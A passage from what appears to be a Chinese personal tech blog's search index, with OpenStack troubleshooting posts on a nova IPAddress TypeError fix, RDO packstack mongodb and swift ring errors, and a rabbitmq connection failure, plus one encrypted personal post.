class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     block_device_info=block_device_info)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py&quot;, line 2616, in spawn</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     admin_pass=admin_password)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py&quot;, line 3097, in _create_image</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     instance, network_info, admin_pass, files, suffix)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py&quot;, line 2894, in _inject_data</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     network_info, libvirt_virt_type=CONF.libvirt.virt_type)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/virt/netutils.py&quot;, line 87, in get_injected_network_template</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     if not (network_info and template):</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/model.py&quot;, line 463, in __len__</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return self._sync_wrapper(fn, *args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/model.py&quot;, line 450, in _sync_wrapper</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     self.wait()</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/model.py&quot;, line 482, in wait</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     self[:] = self._gt.wait()</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/eventlet/greenthread.py&quot;, line 173, in wait</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return self._exit_event.wait()</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/eventlet/event.py&quot;, line 125, in wait</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     current.throw(*self._exc)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/eventlet/greenthread.py&quot;, line 212, in main</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     result = function(*args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/compute/manager.py&quot;, line 1646, in _allocate_network_async</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     dhcp_options=dhcp_options)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/api.py&quot;, line 443, in allocate_for_instance</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     self._delete_ports(neutron, instance, created_port_ids)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/openstack/common/excutils.py&quot;, line 82, in __exit__</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     six.reraise(self.type_, self.value, self.tb)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/api.py&quot;, line 423, in allocate_for_instance</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     security_group_ids, available_macs, dhcp_opts)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/api.py&quot;, line 214, in _create_port</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     port_id = port_client.create_port(port_req_body)[&#x27;port&#x27;][&#x27;id&#x27;]</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/__init__.py&quot;, line 84, in wrapper</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     ret = obj(*args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/v2_0/client.py&quot;, line 98, in with_params</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     ret = self.function(instance, *args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/v2_0/client.py&quot;, line 322, in create_port</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return self.post(self.ports_path, body=body)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/__init__.py&quot;, line 84, in wrapper</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     ret = obj(*args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/v2_0/client.py&quot;, line 1325, in post</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     headers=headers, params=params)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/__init__.py&quot;, line 84, in wrapper</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     ret = obj(*args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/v2_0/client.py&quot;, line 1236, in do_request</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     body = self.serialize(body)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/network/neutronv2/__init__.py&quot;, line 84, in wrapper</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     ret = obj(*args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/v2_0/client.py&quot;, line 1266, in serialize</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     self.get_attr_metadata()).serialize(data, self.content_type())</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/common/serializer.py&quot;, line 390, in serialize</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return self._get_serialize_handler(content_type).serialize(data)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/common/serializer.py&quot;, line 54, in serialize</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return self.dispatch(data, action=action)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/common/serializer.py&quot;, line 44, in dispatch</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return action_method(*args, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/common/serializer.py&quot;, line 66, in default</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return jsonutils.dumps(data, default=sanitizer)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/openstack/common/jsonutils.py&quot;, line 168, in dumps</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return json.dumps(value, default=default, **kwargs)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib64/python2.7/json/__init__.py&quot;, line 250, in dumps</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     sort_keys=sort_keys, **kw).encode(obj)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib64/python2.7/json/encoder.py&quot;, line 207, in encode</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     chunks = self.iterencode(o, _one_shot=True)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib64/python2.7/json/encoder.py&quot;, line 270, in iterencode</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return _iterencode(o, 0)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/neutronclient/common/serializer.py&quot;, line 65, in sanitizer</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     return six.text_type(obj, &#x27;utf8&#x27;)</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab] TypeError: coercing to Unicode: need string or buffer, IPAddress found</span><br></pre></td></tr></table></figure><p>以关键字 “TypeError: coercing to Unicode: need string or buffer, IPAddress found” ，搜索到此bug网页<a href="https://bugs.launchpad.net/nova/+bug/1408529">：https://bugs.launchpad.net/nova/+bug/1408529</a></p><p>文中给出了bug原因：If ip address is provided when running nova boot, nova compute will invoke neutron client to create a port. However, the ip address parameter is an IPAddress object so neutron client will fail to send the request to neutron server. Transform IPAddress object to string to address this issue.</p><p>只需要把发送给neutronclient的参数改为str就可以了</p><p>bug修复<a href="https://git.openstack.org/cgit/openstack/nova/commit/?id=aae858a246e20b1bf55004517b5d9ab28968190a">https://git.openstack.org/cgit/openstack/nova/commit/?id=aae858a246e20b1bf55004517b5d9ab28968190a：</a></p><p>编辑/usr/lib/python2.7/site-packages/nova/network/neutronv2/api.py</p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">198 </span>  try:</span><br><span class="line"><span class="symbol">199 </span>      <span class="keyword">if</span> fixed_ip:</span><br><span class="line"><span class="symbol">200 </span>          port_req_body[<span class="comment">&#x27;port&#x27;][&#x27;fixed_ips&#x27;] = [&#123;&#x27;ip_address&#x27;: fixed_ip&#125;]</span></span><br><span class="line"><span class="symbol">201 </span>          port_req_body[<span class="comment">&#x27;port&#x27;][&#x27;network_id&#x27;] = network_id</span></span><br></pre></td></tr></table></figure><p>修改200行为：</p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">200 </span>           port_req_body[<span class="comment">&#x27;port&#x27;][&#x27;fixed_ips&#x27;] = [&#123;&#x27;ip_address&#x27;: str(fixed_ip)&#125;]</span></span><br></pre></td></tr></table></figure><p>重启 nova-compute后成功指定ip启动虚拟机</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> nova </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵</title>
      <link href="life/sunflower.html"/>
      <url>life/sunflower.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="40e369ee2b9acf40f99b63f0a0fc0a7601472fb24467186b64bc9de5447fba49">91a3f98ed694b0f3ce330b314503f44384bb37ba4ab0235c5f7ba25a2792b7a9f5478f748c0a00c431025939ee5c8573a12373a74b289d95387ee4087d3ac380fb5a5a35a7ac6e6b94045b90619ebf803d14cd654420a242d2a9a3336bf0ce846baa22ea093925ba334a25ae1a72217ec586e701fe65bf11bce2285af3e88be3eeb19baa78c02d496a1b55ce44845c96e6cb5ac7a54e6ef46c0b1af247056dab60d032f02be4ea0c09daed99bd3bde3d9e9c36fd0e614a6df279c1e4445ec068eee12e3a93b9d2d8ba02dbb6daa036b28c572e571c3cb8d61cff8f64a0f8b49d60ebbc2ee51c21518b7c5174c7efa8a2dcc56bf8aff5532219a64c24a2d0af206e933efb7951ea2819334d2601624f8949fb8db8019d9ab83be4587890c7cc5b411900218949dd1ce1b0fc10d5dce922e7dabaf7ec4566af0356e976bc7848bc27c4b6297a5d51326b21ac27401ceda39295aa970f6c37cc49ddadf7d729595d7ecb63b207d052c33d64f348e12869f7f2e2415e766439d96658f7aefaf9a16dae4d6f10fc8270d3bb81ed0f86cc47603f926e17c381166db8c596f48acfae51221ae978e66ed921fc0f2007f11598804034ea9c2c3209003375044f32a14d198f045e4ed51f2d1d90a0b1db403dbf483672b2b355666d245f12fe3595f35e72fa9892cd8b72eceebacb5d3f3e029bf9f95804d16c3a684e2c5bebda584c6388b2ab332cb0df96ef4535fe307be480f6dd25f245e2c4eeeb3758698c75849f49d42b496d7b847ed7de032bcecd963accdc82262d930de3f8fa23a926add5ece5bab424bf96834eb1fb4e43d8ef3d5d33f8dd974b22d197732d41d3eacd95879f4b083172cf245277ebba95ad3e29d3bdee34a61b576fe191f73688210b7d1a644bd0b82575c6a11f4172e5ee715ba95de99b4d18ca43d0e853671168905af9aecb0f139c1c079da2dea09c2b884011e77cd04950609a5a081fa4a23b77d5674ea59edc376581e1c0ad4a5b8d113afc6a5a42280206f4b423db223b3604193f084214b687ca5b68c450b862e18856305ec67bba04fbaacb6609bc2073e76ae882dc9934fa516b4180b8850cc79ae3c6012d8da808438dc65482c2e78d8ecc5c89392fed09ae73425b9986f460c202356676781f110876fe88fe1fa753f079a7f4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sunflower </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDO安装openstack遇到的一些问题(swift &amp; mongodb)</title>
      <link href="openstack/rdo-openstack-errors.html"/>
      <url>openstack/rdo-openstack-errors.html</url>
      
        <content type="html"><![CDATA[<h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">Applying 172.16.43.182_mongodb.pp</span><br><span class="line">172.16.43.182_mongodb.pp:                         [ ERROR ]</span><br><span class="line">Applying Puppet manifests                         [ ERROR ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">ERROR </span>: Error appeared during Puppet run: 172.16.43.182_mongodb.pp</span><br><span class="line"><span class="keyword">Error: </span>Unable to connect to mongodb server! (172.16.43.182:27017)</span><br></pre></td></tr></table></figure><p>解决方法：  </p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /usr/share/openstack-puppet/modules/mongodb/manifests/params.pp  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># RedHat/CentOS doesn&#x27;t come with a prepacked mongodb  </span></span><br><span class="line">        <span class="comment"># so we assume that you are using EPEL repository.  </span></span><br><span class="line">        <span class="variable">$config</span>              = <span class="string">&#x27;/etc/mongod.conf&#x27;</span>              <span class="comment">#修改此行</span></span><br></pre></td></tr></table></figure><h3 id="swift"><a href="#swift" class="headerlink" title="swift"></a>swift</h3><p>解决上面问题再次运行的时候遇到swift报错</p><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">Applying 172.16.43.182_ring_swift.pp</span><br><span class="line">172.16.43.182_ring_swift.pp:                      [ ERROR ]</span><br><span class="line">Applying Puppet manifests                         [ ERROR ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">ERROR </span>: Error appeared during Puppet run: 172.16.43.182_ring_swift.pp</span><br><span class="line"><span class="keyword">Error: </span>Execution of &#x27;/usr/bin/swift-ring-builder /etc/swift/container.builder add r1z1<span class="string">-172</span>.16.43.182:6001/swift_loopback 10.00&#x27; returned 2: Device 0 already uses 172.16.43.182:6001/swift.</span><br><span class="line">You will find full trace in log /var/tmp/packstack/20150530<span class="string">-024816</span>-X42iH8/manifests/172.16.43.182_ring_swift.pp.log</span><br></pre></td></tr></table></figure><span id="more"></span><p>解决办法：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rm -f /etc/swift/*.builder</span></span><br><span class="line">rm -f <span class="regexp">/etc/</span>swift/*.ring.gz</span><br><span class="line">rm -f <span class="regexp">/etc/</span>swift/backups</span><br></pre></td></tr></table></figure><p>持续更新……</p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> RDO </tag>
            
            <tag> swift </tag>
            
            <tag> mongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rabbitmq Error unable to connect to node rabbit@localhost nodedown</title>
      <link href="openstack/openstack-neutron-rabbitmq.html"/>
      <url>openstack/openstack-neutron-rabbitmq.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>打开openstack报错，Error:Unable to retrieve instances.<br><img data-src="/images/uploads/2015/05/113.png" alt="image"><br>猜想肯定是neutron的错误，查询neutron状态，果然没有起，手动启动也报错<br><img data-src="/images/uploads/2015/05/31.png" alt="image"><br><img data-src="/images/uploads/2015/05/41.png" alt="image"></p></li><li><p>查询neutron日志 /var/log/neutron/server.log 有如下错误：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">2015-05-25 10:09:08.489 7123 <span class="builtin-name">ERROR</span> oslo_messaging._drivers.impl_rabbit [-] AMQP<span class="built_in"> server </span>on 172.16.37.211:5672 is unreachable: [Errno 111] ECONNREFUSED. Trying again <span class="keyword">in</span> 1 seconds.</span><br><span class="line">2015-05-25 10:09:09.499 7123 <span class="builtin-name">DEBUG</span> oslo_messaging._drivers.impl_rabbit [-] Received recoverable <span class="builtin-name">error</span> <span class="keyword">from</span> kombu: on_error 